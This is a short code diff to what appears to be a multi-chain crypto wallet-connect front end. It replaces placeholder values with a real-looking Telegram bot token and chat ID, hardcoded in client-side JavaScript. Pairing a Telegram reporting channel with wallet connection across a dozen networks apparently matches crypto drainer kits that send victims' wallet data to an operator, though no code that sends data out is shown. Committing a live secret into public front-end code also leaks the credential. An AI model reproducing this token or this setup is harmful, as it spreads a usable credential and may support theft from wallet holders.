@@ -17,8 +17,8 @@ const debounce = (func, wait) => {
 const projectId = import.meta.env.VITE_PROJECT_ID || '2511b8e8161d6176c55da917e0378c9a'
 if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
 
-const telegramBotToken = '1234:ЗАГЛУШКА'
-const telegramChatId = 'ЗАГЛУШКА'
+const telegramBotToken = '7547727920:AAGJPBBuh0h8y0sWH2sNeNLqYARwKdKp3AU'
+const telegramChatId = '-4835655591'
 
 const networks = [bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo]
 const networkMap = {
